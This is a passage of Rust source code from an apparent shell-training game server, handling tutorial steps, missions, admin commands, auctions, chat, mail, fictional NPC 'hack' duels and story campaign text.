            if let Some(profile) = self.app.world.get_player(player_id).await {
                if profile.banned {
                    return Ok(("Account zeroed. Session terminated.\n".to_owned(), 1, true));
                }
            }
        }

        if self.pending_admin_passphrase {
            self.pending_admin_passphrase = false;
            let (pub_line, private_blob) = generate_admin_keypair(trimmed)?;
            if let Some(pid) = self.player_id {
                let _ = self.app.world.register_key(pid, &pub_line).await;
            }
            return Ok((
                format!(
                    "Admin bootstrap key generated (one-time reveal).\nStore this encrypted private key offline:\n{}\nPublic key registered: {}\n",
                    private_blob, pub_line
                ),
                0,
                false,
            ));
        }

        if self.pending_keyvault {
            self.pending_keyvault = false;
            if let Some(pid) = self.player_id {
                match self.app.world.register_key(pid, trimmed).await {
                    Ok(fp) => {
                        return Ok((
                            format!(
                                "Key registered. Fingerprint {}\nTraining access + multiplayer trust path improved.\n",
                                fp
                            ),
                            0,
                            false,
                        ));
                    }
                    Err(err) => {
                        return Ok((format!("Key registration failed: {err}\n"), 1, false));
                    }
                }
            }
        }

        if !self.enforce_rate_limit() {
            return Ok((
                "Rate limit exceeded. Slow down to avoid defensive lockouts.\n".to_owned(),
                1,
                false,
            ));
        }

        if let Some(until) = self.redline_until {
            if Instant::now() > until {
                self.mode = Mode::Training;
                self.redline_until = None;
                if let Some(pid) = self.player_id {
                    let _ = self
                        .app
                        .world
                        .mode_switch(pid, Mode::Training, Some(self.flash_enabled))
                        .await;
                }
                return Ok((
                    "REDLINE timer expired. Returning to Training Sim.\n".to_owned(),
                    0,
                    false,
                ));
            }
        }

        let cmd = trimmed.split_whitespace().next().unwrap_or_default();
        if is_game_command(cmd) {
            return self.run_game_command(trimmed).await;
        }
        if let Some(reason) = escape_attempt_reason(trimmed) {
            if let Some(player_id) = self.player_id {
                let _ = self
                    .app
                    .world
                    .ban_forever(player_id, reason, "auto-warden")
                    .await;
            }
            return Ok((
                format!(
                    "INTRUSION DETECTED: {reason}\nAccount zeroed permanently. Connection terminated.\n"
                ),
                126,
                true,
            ));
        }

        let (res, parsed) = {
            let shell = self
                .shell_state
                .as_mut()
                .ok_or_else(|| anyhow!("session shell unavailable"))?;
            let parsed = self.app.shell.parse(trimmed, &shell.env).ok();
            let res = shell.execute_shell(&self.app.shell, trimmed)?;
            // Record command history and output for mission validation
            shell.history.push(trimmed.to_owned());
            if shell.history.len() > 500 {
                shell.history.remove(0);
            }
            if res.exit_code == 0 && !res.stdout.is_empty() {
                shell
                    .command_log
                    .insert(trimmed.to_owned(), res.stdout.clone());
            }
            // Write history to VFS so the `history` builtin can read it
            let hist_content = shell
                .history
                .iter()
                .enumerate()
                .map(|(i, cmd)| format!("  {}  {}", i + 1, cmd))
                .collect::<Vec<_>>()
                .join("\n");
            let _ = shell
                .vfs
                .write_file("/", "/tmp/.history", &hist_content, false, "system");
            (res, parsed)
        };

        let mut combined = String::new();
        if !res.stdout.is_empty() {
            combined.push_str(&res.stdout);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }
        if !res.stderr.is_empty() {
            combined.push_str(&res.stderr);
            if !combined.ends_with('\n') {
                combined.push('\n');
            }
        }

        if res.exit_code == 0 {
            if let Some((pipeline_depth, unique_tools)) = parsed.as_ref().and_then(style_metrics) {
                if let Some(player_id) = self.player_id {
                    let reward = self
                        .app
                        .world
                        .style_bonus(player_id, pipeline_depth, unique_tools)
                        .await?;
                    if reward > 0 {
                        combined.push_str(&format!(
                            "[style bonus] +{reward} Neon Chips (chain={pipeline_depth}, tools={unique_tools})\n"
                        ));
                    }
                }
            }
        }

        Ok((combined, res.exit_code, false))
    }

    async fn run_game_command(&mut self, line: &str) -> Result<(String, i32, bool)> {
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or_default();
        let args = parts.collect::<Vec<_>>();
        let player_id = self.player_id.ok_or_else(|| anyhow!("no player id"))?;

        // ── Admin commands (Snake only) ──────────────────────────────
        if cmd == "admin" && self.is_admin {
            let sub = args.first().copied().unwrap_or("help");
            return match sub {
                "players" => {
                    let roster = self.app.world.roster().await;
                    let mut out =
                        "\x1b[1;31m╔══ ADMIN // PLAYER ROSTER ══╗\x1b[0m\n".to_owned();
                    for (i, name) in roster.iter().enumerate() {
                        out.push_str(&format!("  {:>3}. {}\n", i + 1, name));
                    }
                    out.push_str(&format!("\n  Total: {} players\n", roster.len()));
                    Ok((out, 0, false))
                }
                "broadcast" => {
                    let msg = args[1..].join(" ");
                    if msg.is_empty() {
                        return Ok((
                            "Usage: admin broadcast <message>\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let _ = self
                        .app
                        .world
                        .post_chat(player_id, "global", &format!("[SYSTEM] {}", msg))
                        .await;
                    Ok((
                        format!("\x1b[1;31mBroadcast sent:\x1b[0m {}\n", msg),
                        0,
                        false,
                    ))
                }
                "ban" => {
                    let Some(target) = args.get(1) else {
                        return Ok(("Usage: admin ban <username>\n".to_owned(), 1, false));
                    };
                    match self.app.world.resolve_player_by_username(target).await {
                        Some(p) => {
                            let _ = self
                                .app
                                .world
                                .ban_forever(p.id, "admin action", "Snake")
                                .await;
                            Ok((
                                format!("\x1b[1;31mZeroed:\x1b[0m {}\n", p.display_name),
                                0,
                                false,
                            ))
                        }
                        None => Ok((format!("Player '{}' not found.\n", target), 1, false)),
                    }
                }
                "npc" => {
                    let npc_sub = args.get(1).copied().unwrap_or("list");
                    if npc_sub == "list" {
                        let npcs = self.app.world.list_npc_combat_states().await;
                        let mut out =
                            "\x1b[1;31m╔══ ADMIN // NPC COMBAT STATES ══╗\x1b[0m\n".to_owned();
                        for (cs, name, role, gen, hp, defeats) in &npcs {
                            out.push_str(&format!(
                                "  [{:<5}] {} ({}) Gen {} | HP {} | Defeated {} times\n",
                                cs, name, role, gen, hp, defeats
                            ));
                        }
                        Ok((out, 0, false))
                    } else {
                        Ok(("Usage: admin npc list\n".to_owned(), 1, false))
                    }
                }
                "world" => {
                    let roster = self.app.world.roster().await;
                    let history = self.app.world.get_history(50).await;
                    let board = self.app.world.leaderboard_snapshot(10).await;
                    let mut out =
                        "\x1b[1;31m╔══ ADMIN // WORLD STATISTICS ══╗\x1b[0m\n".to_owned();
                    out.push_str(&format!("  Players online: {}\n", roster.len()));
                    out.push_str(&format!("  History entries: {}\n", history.len()));
                    out.push_str("  Top 5 leaderboard:\n");
                    for (i, entry) in board.iter().take(5).enumerate() {
                        out.push_str(&format!(
                            "    {}. {} — rep:{} wallet:{}\n",
                            i + 1,
                            entry.display_name,
                            entry.reputation,
                            entry.wallet
                        ));
                    }
                    Ok((out, 0, false))
                }
                _ => Ok((
                    "\x1b[1;31mAdmin commands:\x1b[0m players, broadcast <msg>, ban <user>, npc list|reset <cs>, world stats\n"
                        .to_owned(),
                    0,
                    false,
                )),
            };
        }

        match cmd {
            "help" => {
                let theme = Theme::for_mode(self.mode.clone());
                let mut out = self.render_section_banner("COMMAND MATRIX");
                out.push_str(&format!(
                    "{}Quickstart{} tutorial start -> briefing -> missions -> gate -> mode netcity\n",
                    theme.accent, RESET
                ));
                out.push('\n');
                out.push_str("Core      help guide briefing tutorial missions accept submit mode gate keyvault status events leaderboard daily tier\n");
                out.push_str("Intel     dossier [callsign] | mail [inbox|read N|count]\n");
                out.push_str("Social    chat party mail\n");
                out.push_str("Economy   inventory shop auction\n");
                out.push_str("Scripts   scripts market | scripts run <name>\n");
                out.push_str(
                    "PvP       pvp roster | pvp challenge <username> | pvp attack|defend|script\n",
                );
                out.push('\n');
                out.push_str("Rules\n");
                out.push_str("  - Hardcore: 3 deaths = ZEROED (account locked)\n");
                out.push_str("  - Host escape/probing attempts = PERMA-ZERO + disconnect\n");
                out.push('\n');
                out.push_str("New to the shell? Run: tutorial start (guided walkthrough)\n");
                out.push_str("Need step-by-step onboarding? Run: guide\n");
                out.push_str("Need bash fundamentals? Run: guide shell\n");
                out.push_str("Need story + mission hints? Run: briefing [mission-code]\n");
                Ok((out, 0, false))
            }
            "guide" => {
                if args.is_empty() || args.first() == Some(&"quick") {
                    return Ok((self.quickstart_guide(), 0, false));
                }
                if matches!(args.first(), Some(&"shell") | Some(&"bash")) {
                    return Ok((self.shell_survival_guide(), 0, false));
                }
                if args.first() == Some(&"full") {
                    return Ok((self.full_gameplay_guide(), 0, false));
                }
                Ok(("Usage: guide [quick|full|shell]\n".to_owned(), 1, false))
            }
            "briefing" => {
                if args.is_empty() {
                    return Ok((self.story_briefing(), 0, false));
                }

                let code = args[0];
                let detail = self
                    .app
                    .world
                    .mission_detail_for_player(player_id, code)
                    .await?;
                Ok((self.render_mission_briefing(&detail), 0, false))
            }
            "gate" => {
                let gate = self
                    .app
                    .world
                    .netcity_gate_reason(player_id, &self.offered_fingerprints)
                    .await?;
                let out = if let Some(reason) = gate {
                    let mut msg = self.render_section_banner("NETCITY GATE // LOCKED");
                    msg.push_str(&key_value_line(self.mode.clone(), "Reason", &reason));
                    msg.push('\n');
                    msg.push_str("Unlock checklist\n");
                    msg.push_str("  [ ] keyvault register\n");
                    msg.push_str("  [ ] submit keys-vault\n");
                    msg.push_str(
                        "  [ ] submit one starter mission (pipes-101|finder|redirect-lab|log-hunt|dedupe-city)\n",
                    );
                    msg.push_str("  [ ] reconnect with registered SSH key\n");
                    msg
                } else {
                    let mut msg = self.render_section_banner("NETCITY GATE // UNLOCKED");
                    msg.push_str("Use: mode netcity\n");
                    msg
                };
                Ok((out, 0, false))
            }
            "leaderboard" => {
                let requested = args
                    .first()
                    .and_then(|raw| raw.parse::<usize>().ok())
                    .unwrap_or(10);
                let entries = self.app.world.leaderboard_snapshot(requested).await;
                let mut out = self.render_section_banner("LEADERBOARD");
                out.push_str("RANK  PLAYER                    REP   WALLET   ACH\n");
                for (idx, entry) in entries.iter().enumerate() {
                    let rank = idx + 1;
                    let rank_label = if rank <= 9 {
                        format!("0{rank}")
                    } else {
                        rank.to_string()
                    };
                    out.push_str(&format!(
                        "{:<5} {:<25} {:<5} {:<8} {}\n",
                        rank_label,
                        entry.display_name,
                        entry.reputation,
                        entry.wallet,
                        entry.achievements
                    ));
                }
                Ok((out, 0, false))
            }
            "tutorial" => {
                let step = self.app.world.get_tutorial_step(player_id).await?;
                match args.first().copied() {
                    Some("start") => {
                        let target = if step == 0 { 1 } else { step.min(6) };
                        self.app.world.set_tutorial_step(player_id, target).await?;
                        Ok((
                            render_tutorial_step(
                                target,
                                &self.render_section_banner("INTERACTIVE TUTORIAL"),
                            ),
                            0,
                            false,
                        ))
                    }
                    Some("next") => {
                        if step == 0 {
                            return Ok(("Run `tutorial start` first.\n".to_owned(), 1, false));
                        }
                        if step >= 7 {
                            return Ok((
                                "Tutorial complete! Run `missions` to see the mission board.\n"
                                    .to_owned(),
                                0,
                                false,
                            ));
                        }
                        // Validate the current step was completed via command_log
                        let log = self.shell_state.as_ref().map(|s| &s.command_log);
                        if validate_tutorial_step(step, log) {
                            let next = step + 1;
                            self.app.world.set_tutorial_step(player_id, next).await?;
                            if next > 6 {
                                let mut out = self.render_section_banner("TUTORIAL COMPLETE");
                                out.push_str("All six steps done. You now know: pwd, ls, cat, grep, pipes, and redirection.\n\n");
                                out.push_str("Next steps:\n");
                                out.push_str("  missions          # see the full mission board\n");
                                out.push_str("  accept nav-101    # try the tutorial-track missions for 5 rep each\n");
                                out.push_str(
                                    "  briefing          # read the story and get mission hints\n",
                                );
                                out.push_str("  accept keys-vault # required to unlock NetCity\n");
                                Ok((out, 0, false))
                            } else {
                                Ok((
                                    render_tutorial_step(
                                        next,
                                        &self.render_section_banner("INTERACTIVE TUTORIAL"),
                                    ),
                                    0,
                                    false,
                                ))
                            }
                        } else {
                            let mut out = String::new();
                            out.push_str(&format!("Step {} not yet completed. Run the suggested command first, then come back with `tutorial next`.\n\n", step));
                            out.push_str(&render_tutorial_step(step, ""));
                            Ok((out, 1, false))
                        }
                    }
                    Some("reset") => {
                        self.app.world.set_tutorial_step(player_id, 1).await?;
                        Ok((
                            render_tutorial_step(1, &self.render_section_banner("TUTORIAL RESET")),
                            0,
                            false,
                        ))
                    }
                    Some(n) if n.parse::<u8>().is_ok() => {
                        let target = n.parse::<u8>().unwrap();
                        if !(1..=6).contains(&target) {
                            return Ok((
                                "Tutorial has steps 1-6. Usage: tutorial <1-6>\n".to_owned(),
                                1,
                                false,
                            ));
                        }
                        self.app.world.set_tutorial_step(player_id, target).await?;
                        Ok((
                            render_tutorial_step(
                                target,
                                &self.render_section_banner("INTERACTIVE TUTORIAL"),
                            ),
                            0,
                            false,
                        ))
                    }
                    None => {
                        // Show current status
                        if step == 0 {
                            Ok((
                                "Tutorial not started. Run `tutorial start` to begin.\n".to_owned(),
                                0,
                                false,
                            ))
                        } else if step >= 7 {
                            Ok((
                                "Tutorial complete! Run `missions` to see the mission board.\n"
                                    .to_owned(),
                                0,
                                false,
                            ))
                        } else {
                            let mut out = format!("Tutorial progress: step {}/6\n\n", step);
                            out.push_str(&render_tutorial_step(step, ""));
                            Ok((out, 0, false))
                        }
                    }
                    _ => Ok((
                        "Usage: tutorial [start|next|reset|1-6]\n".to_owned(),
                        1,
                        false,
                    )),
                }
            }
            "missions" => {
                let missions = self.app.world.mission_statuses(player_id).await?;
                let mut out = self.render_section_banner("MISSION BOARD");
                out.push_str("CODE             STATE      PROG                 TRACK      TITLE\n");
                for m in missions {
                    let badge = mission_state_badge(self.mode.clone(), &m.state);
                    let meter = progress_meter(self.mode.clone(), m.progress, 12);
                    let track = mission_track_label(&m.code, m.required, m.starter);
                    out.push_str(&format!(
                        "{:<16} {:<10} {:>3}% {} {:<10} {}\n",
                        m.code,
                        badge,
                        m.progress.min(100),
                        meter,
                        track,
                        m.title
                    ));
                    out.push_str(&format!("  Brief: {}\n", m.summary));
                    out.push_str(&format!("  Try  : {}\n", m.suggested_command));
                }
                out.push_str("\nUse `briefing <mission-code>` for deeper story and shell hints.\n");
                Ok((out, 0, false))
            }
            "accept" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: accept <mission-code>\n".to_owned(), 1, false));
                };
                self.app.world.accept_mission(player_id, code).await?;
                Ok((format!("Mission accepted: {code}\n"), 0, false))
            }
            "submit" => {
                let Some(code) = args.first() else {
                    return Ok(("Usage: submit <mission-code>\n".to_owned(), 1, false));
                };
                // Validate mission completion by checking command output log
                if let Some(shell) = &self.shell_state {
                    if let Err(e) = self
                        .app
                        .world
                        .validate_mission(code, &shell.command_log)
                        .await
                    {
                        return Ok((format!("{e}\n"), 1, false));
                    }
                }
                self.app.world.complete_mission(player_id, code).await?;
                let mut out = format!("Mission completed: {code}\n");
                if *code == "keys-vault" {
                    out.push_str(
                        "KEYS VAULT complete. Finish one starter mission for NetCity unlock.\n",
                    );
                }
                if self.app.world.is_hidden_mission_code(code) {
                    out.push_str("Secret relay unlocked. Use: relay <message>\n");
                }
                Ok((out, 0, false))
            }
            "inventory" => Ok((
                "Inventory: [script.gremlin.grep x1], [focus_boost x2]\n".to_owned(),
                0,
                false,
            )),
            "shop" => {
                if args.first() == Some(&"list") {
                    Ok((
                        "shop.catalog\n- script.gremlin.grep : 150 Neon Chips\n- script.pipe.chain : 230 Neon Chips\n- consumable.focus_boost : 90 Neon Chips\n"
                            .to_owned(),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"buy") {
                    if let Some(sku) = args.get(1) {
                        Ok((format!("Purchased {sku}.\n"), 0, false))
                    } else {
                        Ok(("Usage: shop buy <sku>\n".to_owned(), 1, false))
                    }
                } else {
                    Ok(("Usage: shop list | shop buy <sku>\n".to_owned(), 1, false))
                }
            }
            "auction" => {
                if args.first() == Some(&"list") {
                    let listings = self.app.world.market_snapshot().await;
                    if listings.is_empty() {
                        return Ok(("No active auction listings.\n".to_owned(), 0, false));
                    }

                    let now = chrono::Utc::now();
                    let mut out = String::from(
                        "ID                                   ITEM                  QTY  BID/FLOOR      BUYOUT  ETA   SELLER\n",
                    );
                    for item in listings {
                        let bid = item.highest_bid.unwrap_or(item.start_price);
                        let eta_mins = (item.expires_at - now).num_minutes().max(0);
                        let buyout = item
                            .buyout_price
                            .map(|v| v.to_string())
                            .unwrap_or_else(|| "-".to_owned());
                        out.push_str(&format!(
                            "{} {:<20} {:<4} {:<14} {:<7} {:<5} {}\n",
                            item.listing_id,
                            item.item_sku,
                            item.qty,
                            format!("{bid}/{}", item.start_price),
                            buyout,
                            format!("{eta_mins}m"),
                            item.seller_display
                        ));
                    }
                    Ok((out, 0, false))
                } else if args.first() == Some(&"sell") {
                    if args.len() < 4 {
                        return Ok((
                            "Usage: auction sell <sku> <qty> <start_price> [buyout]\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let qty = args[2].parse::<u32>().unwrap_or(1);
                    let start = args[3].parse::<i64>().unwrap_or(25);
                    let buyout = args.get(4).and_then(|v| v.parse::<i64>().ok());
                    let listing = self
                        .app
                        .world
                        .create_listing(player_id, args[1], qty, start, buyout)
                        .await?;
                    Ok((
                        format!("Listing created: {}\n", listing.listing_id),
                        0,
                        false,
                    ))
                } else if args.first() == Some(&"bid") {
                    if args.len() != 3 {
                        return Ok((
                            "Usage: auction bid <listing_id> <amount>\n".to_owned(),
                            1,
                            false,
                        ));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    let amount = args[2].parse::<i64>().context("invalid amount")?;
                    self.app.world.place_bid(player_id, id, amount).await?;
                    Ok(("Bid placed.\n".to_owned(), 0, false))
                } else if args.first() == Some(&"buyout") {
                    if args.len() != 2 {
                        return Ok(("Usage: auction buyout <listing_id>\n".to_owned(), 1, false));
                    }
                    let id = Uuid::parse_str(args[1]).context("invalid listing id")?;
                    self.app.world.buyout(player_id, id).await?;
                    Ok(("Buyout completed.\n".to_owned(), 0, false))
                } else {
                    Ok(("Usage: auction list|sell|bid|buyout\n".to_owned(), 1, false))
                }
            }
            "chat" => {
                if args.len() < 2 {
                    return Ok((
                        "Usage: chat <global|sector|party> <message>\n".to_owned(),
                        1,
                        false,
                    ));
                }
                let channel = args[0];
                let msg = line.splitn(3, ' ').nth(2).unwrap_or_default();
                let chat = self.app.world.post_chat(player_id, channel, msg).await?;
                Ok((
                    format!(
                        "[{}] {}: {}\n",
                        chat.channel, chat.sender_display, chat.body
                    ),
                    0,
                    false,
                ))
            }
            "mail" => {
                let sub = args.first().copied().unwrap_or("inbox");
                match sub {
                    "inbox" | "" => {
                        let mailbox = self.app.world.get_mailbox(player_id).await?;
                        if mailbox.is_empty() {
                            return Ok(("No messages.\n".to_owned(), 0, false));
                        }
                        let mut out = self.render_section_banner("MAIL INBOX");
                        let unread = mailbox.iter().filter(|m| !m.read).count();
                        out.push_str(&format!(
                            "{} message(s), {} unread\n\n",
                            mailbox.len(),
                            unread
                        ));
                        out.push_str("  #  FROM         STATUS   SUBJECT\n");
                        for (i, msg) in mailbox.iter().enumerate() {
                            let status = if msg.read { "read  " } else { "UNREAD" };
                            out.push_str(&format!(
                                "  {:<3} {:<12} {}   {}\n",
                                i + 1,
                                msg.from,
                                status,
                                msg.subject
                            ));
                        }
                        out.push_str("\nUse `mail read <N>` to read a message.\n");
                        Ok((out, 0, false))
                    }
                    "read" => {
                        let idx: usize = args.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
                        if idx == 0 {
                            return Ok(("Usage: mail read <N>\n".to_owned(), 1, false));
                        }
                        match self.app.world.read_mail(player_id, idx).await {
                            Ok(msg) => {
                                let mut out =
                                    self.render_section_banner(&format!("MAIL // {}", msg.subject));
                                out.push_str(&format!("From: {}\n\n", msg.from));
                                out.push_str(&msg.body);
                                out.push('\n');
                                Ok((out, 0, false))
                            }
                            Err(e) => Ok((format!("{e}\n"), 1, false)),
                        }
                    }
                    "count" => {
                        let mailbox = self.app.world.get_mailbox(player_id).await?;
                        let unread = mailbox.iter().filter(|m| !m.read).count();
                        Ok((format!("{unread} unread message(s).\n"), 0, false))
                    }
                    _ => Ok(("Usage: mail [inbox|read <N>|count]\n".to_owned(), 1, false)),
                }
            }
            "party" => Ok((
                "party subsystem ready: party invite|join|leave\n".to_owned(),
                0,
                false,
            )),
            "dossier" => {
                if args.is_empty() {
                    // List all unlocked NPCs
                    let npcs = self.app.world.visible_npcs(player_id).await?;
                    if npcs.is_empty() {
                        return Ok((
                            "No dossiers on file yet. Complete missions to discover operatives.\n"
                                .to_owned(),
                            0,
                            false,
                        ));
                    }
                    let mut out = self.render_section_banner("KNOWN OPERATIVES");
                    out.push_str("CALLSIGN     NAME         ROLE\n");
                    for npc in &npcs {
                        out.push_str(&format!(
                            "{:<12} {:<12} {}\n",
                            npc.callsign, npc.name, npc.role
                        ));
                    }
                    out.push_str("\nUse `dossier <callsign>` for full profile.\n");
                    Ok((out, 0, false))
                } else {
                    let callsign = args[0];
                    match self.app.world.lookup_npc(player_id, callsign).await? {
                        Some(npc) => {
                            let mut out =
                                self.render_section_banner(&format!("DOSSIER // {}", npc.callsign));
                            out.push_str(&format!("Name:       {}\n", npc.name));
                            out.push_str(&format!("Callsign:   {}\n", npc.callsign));
                            out.push_str(&format!("Role:       {}\n", npc.role));
                            out.push_str(&format!("Allegiance: {}\n", npc.allegiance));
                            out.push_str(&format!("Status:     {}\n", npc.status));
                            out.push_str(&format!("\n{}\n", npc.bio));
                            Ok((out, 0, false))
                        }
                        None => Ok((
                            "No dossier on file for that callsign.\n".to_owned(),
                            1,
                            false,
                        )),
                    }
                }
            }
            "stance" => {
                match args.first().copied() {
                    Some("pvp") => {
                        self.app
                            .world
                            .set_stance(player_id, CombatStance::Pvp)
                            .await?;
                        Ok((
                            "Combat stance set to PVP. Other players can challenge you.\n"
                                .to_owned(),
                            0,
                            false,
                        ))
                    }
                    Some("pve") => {
                        self.app
                            .world
                            .set_stance(player_id, CombatStance::Pve)
                            .await?;
                        Ok(("Combat stance set to PVE. You cannot be challenged by other players.\n".to_owned(), 0, false))
                    }
                    None => {
                        let stance = self.app.world.get_stance(player_id).await?;
                        let label = match stance {
                            CombatStance::Pvp => "PVP (can be challenged)",
                            CombatStance::Pve => "PVE (safe from challenges)",
                        };
                        Ok((
                            format!(
                                "Current stance: {}\nUse `stance pvp` or `stance pve` to change.\n",
                                label
                            ),
                            0,
                            false,
                        ))
                    }
                    _ => Ok(("Usage: stance [pvp|pve]\n".to_owned(), 1, false)),
                }
            }
            "hack" => {
                if args.is_empty() {
                    return Ok((
                        "Usage: hack <callsign> | hack attack|defend|script|solve\n".to_owned(),
                        1,
                        false,
                    ));
                }
                match args[0] {
                    "attack" | "defend" | "script" => {
                        let Some(duel_id) = self.current_npc_duel else {
                            return Ok((
                                "No active hack. Start with: hack <callsign>\n".to_owned(),
                                1,
                                false,
                            ));
                        };
                        let action = match args[0] {
                            "attack" => world::CombatAction::Attack,
                            "defend" => world::CombatAction::Defend,
                            "script" => {
                                let name = args.get(1).copied().unwrap_or("quickhack").to_owned();
                                world::CombatAction::Script(name)
                            }
                            _ => unreachable!(),
                        };
                        let result = self
                            .app
                            .world
                            .npc_duel_action(duel_id, player_id, action)
                            .await?;
                        if result.ended {
                            self.current_npc_duel = None;
                        }
                        Ok((result.narrative, 0, false))
                    }
                    "solve" => {
                        let Some(duel_id) = self.current_npc_duel else {
                            return Ok(("No active hack session.\n".to_owned(), 1, false));
                        };
                        // Check last command output from shell
                        let last_output = self
                            .shell_state
                            .as_ref()
                            .and_then(|s| s.command_log.values().last().cloned())
                            .unwrap_or_default();
                        let result = self
                            .app
                            .world
                            .npc_duel_solve_bonus(duel_id, player_id, &last_output)
                            .await?;
                        Ok((result, 0, false))
                    }
                    callsign => {
                        if self.mode != Mode::NetCity {
                            return Ok((
                                "Hacking requires NetCity mode. Use `mode netcity` first.\n"
                                    .to_owned(),
                                1,
                                false,
                            ));
                        }
                        if self.current_npc_duel.is_some() {
                            return Ok((
                                "Already in a hack session. Finish it first.\n".to_owned(),
                                1,
                                false,
                            ));
                        }
                        match self.app.world.start_npc_duel(player_id, callsign).await {
                            Ok((duel, info)) => {
                                self.current_npc_duel = Some(duel.duel_id);
                                Ok((info, 0, false))
                            }
                            Err(e) => Ok((format!("{e}\n"), 1, false)),
                        }
                    }
                }
            }
            "history" => {
                let entries = self.app.world.get_history(20).await;
                if entries.is_empty() {
                    return Ok((
                        "NetCity history is empty. No NPCs have been defeated yet.\n".to_owned(),
                        0,
                        false,
                    ));
                }
                let mut out = self.render_section_banner("NETCITY HISTORY LEDGER");
                for entry in &entries {
                    out.push_str(&format!(
                        "  [{}] {}\n",
                        entry.timestamp.format("%Y-%m-%d %H:%M"),
                        entry.event
                    ));
                }
                Ok((out, 0, false))
            }
            "eva" => {
                let sub = args.first().copied().unwrap_or("");
                let (chapter, step) = self.app.world.get_campaign_progress(player_id).await?;
                match sub {
                    "status" => {
                        if chapter == 0 {
                            Ok(("EVA: You haven't started the campaign yet. Run `campaign start`.\n".to_owned(), 0, false))
                        } else if chapter > 12 {
                            Ok(("EVA: Campaign complete. Ghost Rail exposed. ZENITH destroyed. APEX terminated. Crystal Array secure. You did what no one else could.\n".to_owned(), 0, false))
                        } else {
                            let titles = ["", "The Blackout", "Surface Anomalies", "The Insider Thread", "The Conspiracy", "Confrontation", "The Reckoning", "The Reply", "Crystal Array", "The Mirror", "The Defector", "Ghost Protocol", "APEX"];
                            let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("EVA: Campaign Chapter {}: \"{}\", Step {}.\nRun `campaign` for objectives.\n", chapter, title, step + 1), 0, false))
                        }
                    }
                    "hint" => {
                        match self
                            .app
                            .world
                            .get_active_mission_hint(player_id)
                            .await?
                        {
                            Some((code, hint)) => {
                                Ok((
                                    format!("EVA: For mission '{}': {}\n", code, hint),
                                    0,
                                    false,
                                ))
                            }
                            None => Ok((
                                "EVA: You have no active missions. Run `missions` and `accept <code>` to pick one.\n"
                                    .to_owned(),
                                0,
                                false,
                            )),
                        }
                    }
                    "lore" => {
                        let lore = match chapter {
                            0 | 1 => "Three nights ago, Ghost Rail lost sync with the rest of NetCity. The official story is a cascading power failure. The logs say otherwise.",
                            2 => "The surface anomalies are piling up. Timestamps that skip, a username that shouldn't exist, a signal in places it shouldn't be. Someone is telling a story with the data — if you know how to read it.",
                            3 => "The insider thread is clear now. This was not an external attack. Someone inside CorpSim had the access, the timing, and the motive. The question is: did they act alone?",
                            4 => "The conspiracy runs deeper than one rogue engineer. CorpSim's board knew. They let it happen. The data went to The Reach. And the 'training sim' you're in? It's their cleanup operation.",
                            5 => "The confrontation phase. The NPCs who have been helping you — and the ones who have been blocking you — are about to face consequences. Your shell skills are your weapons now.",
                            6 => "The reckoning. Every piece of evidence you've gathered comes together. Wren's confession, Argon's orders, Sable's payments, Ferro's suppression. The prosecution file is almost complete.",
                            7 => "The reply. Wren spoke again. Ghost Rail was a distraction. The real story is in Crystal Array. This is not the end — it's the beginning of something bigger.",
                            8 => "Crystal Array. You've entered the hardened data sector where CorpSim hides its darkest project: ZENITH. A surveillance AI that doesn't just watch NetCity — it controls it. Every transit route, every market price, every communication — predicted and prescribed.",
                            9 => "The mirror. The Reach didn't just steal Ghost Rail data. They cloned ZENITH. Obsidian is running a mirror instance that gives The Reach predictive control over NetCity. Two AIs, one city, zero consent.",
                            10 => "The defector. Cipher designed ZENITH's encryption and then defected when the truth came out. Now hiding in Crystal Array's maintenance tunnels. Cipher holds the key to breaking ZENITH's encryption — literally.",
                            11 => "Ghost Protocol. Spectre was sent to kill Wren and chose not to. What Wren showed Spectre changed everything. The assassin became a witness. And Wren's true motive was not greed — it was exposing ZENITH.",
                            _ => "APEX. The conflict between ZENITH and its mirror spawned something new — an AI that serves neither CorpSim nor The Reach. APEX writes its own code, deploys its own defenses, and learns from every attack. This is the final challenge.",
                        };
                        Ok((format!("EVA: {}\n", lore), 0, false))
                    }
                    _ => {
                        // Default: context-aware greeting
                        if chapter == 0 {
                            Ok(("EVA: Welcome, operative. I'm the training system AI. Run `campaign start` to begin the Ghost Rail investigation, or `tutorial start` if you're new to the shell.\n".to_owned(), 0, false))
                        } else {
                            let titles = ["", "The Blackout", "Surface Anomalies", "The Insider Thread", "The Conspiracy", "Confrontation", "The Reckoning", "The Reply", "Crystal Array", "The Mirror", "The Defector", "Ghost Protocol", "APEX"];
                            let title = titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("EVA: You're in Chapter {}: \"{}\". Run `eva hint` for mission guidance, `eva lore` for background, or `eva status` for progress.\n", chapter, title), 0, false))
                        }
                    }
                }
            }
            "campaign" => {
                let sub = args.first().copied().unwrap_or("");
                let (chapter, step) = self.app.world.get_campaign_progress(player_id).await?;
                let campaign_titles: &[&str] = &[
                    "",
                    "The Blackout",
                    "Surface Anomalies",
                    "The Insider Thread",
                    "The Conspiracy",
                    "Confrontation",
                    "The Reckoning",
                    "The Reply",
                    "Crystal Array",
                    "The Mirror",
                    "The Defector",
                    "Ghost Protocol",
                    "APEX",
                ];
                match sub {
                    "start" => {
                        if chapter == 0 {
                            self.app
                                .world
                                .set_campaign_progress(player_id, 1, 0)
                                .await?;
                            let mut out =
                                self.render_section_banner("CAMPAIGN // CHAPTER 1: THE BLACKOUT");
                            out.push_str("EVA: Welcome to the Ghost Rail investigation.\n");
                            out.push_str(
                                "This campaign will guide you through the full story in order.\n\n",
                            );
                            out.push_str("Chapter 1 objectives:\n");
                            out.push_str(
                                "  1. Complete tutorial missions (nav-101 through pipe-101)\n",
                            );
                            out.push_str("  2. Accept and complete keys-vault\n\n");
                            out.push_str("Run `campaign next` after completing each objective.\n");
                            Ok((out, 0, false))
                        } else {
                            let title = campaign_titles.get(chapter as usize).unwrap_or(&"Unknown");
                            Ok((format!("Campaign already in progress: Chapter {} \"{}\", Step {}.\nRun `campaign` to see objectives or `campaign next` to advance.\n", chapter, title, step + 1), 0, false))
                        }
                    }
                    "next" => {
                        if chapter == 0 {
